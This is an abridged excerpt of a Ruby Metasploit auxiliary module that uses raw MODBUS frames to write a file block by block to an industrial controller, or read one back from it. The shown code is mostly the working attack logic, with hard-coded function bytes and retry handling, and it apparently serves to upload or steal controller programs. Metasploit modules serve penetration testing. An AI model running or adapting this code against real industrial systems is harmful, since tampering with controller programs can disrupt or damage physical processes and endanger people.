...
class MetasploitModule < Msf::Auxiliary
  ...
  def makeframe(packetdata)
    if packetdata.size > 255
      print_error("MODBUS - Packet too large: #{packetdata.inspect}")
      return
    end
    payload = ''
  ...
  def writefile
    ...
    if response[8..9] == "\x01\xfe"
      print_status("MODBUS - Write request success!  Writing file...")
    else
      print_error("MODBUS - Write request error.  Aborting.")
      return
    end
    payload = "\x00\x5a\x01\x04"
    sendframe(makeframe(payload))
    ...
    while block <= fullblocks
      ...
      vprint_status "MODBUS - Block #{block}: #{payload.inspect}"
      if res[8..9] != "\x01\xfe"
        print_error("MODBUS - Failure writing block #{block}")
        return
      end
      # redo this iteration of the loop if we're on block 2
      if (block2status == 0) && (block == 2)
        print_status("MODBUS - Sending block 2 a second time")
        block2status = 1
        redo
      end
      block += 1
    ...
    if lastblocksize > 0
      ...
      res = sendframe(makeframe(payload))
      if res[8..9] != "\x01\xfe"
        print_error("MODBUS - Failure writing last block")
        return
      end
    end
    vprint_status "MODBUS - Closing file"
  ...
  def readfile
    print_status "MODBUS - Sending read request"
    file = File.open(datastore['FILENAME'], 'wb')
    payload = "\x00\x5a\x01\x33\x00\x01\xfb\x00"
    sendframe(makeframe(payload))
    print_status("MODBUS - Retrieving file")
    block = 1
    filedata = ''
    finished = false
    until finished
      ...
      vprint_status "MODBUS - Block #{block}: #{response[0xe..].inspect}"
    ...
    print_status("MODBUS - Closing file")
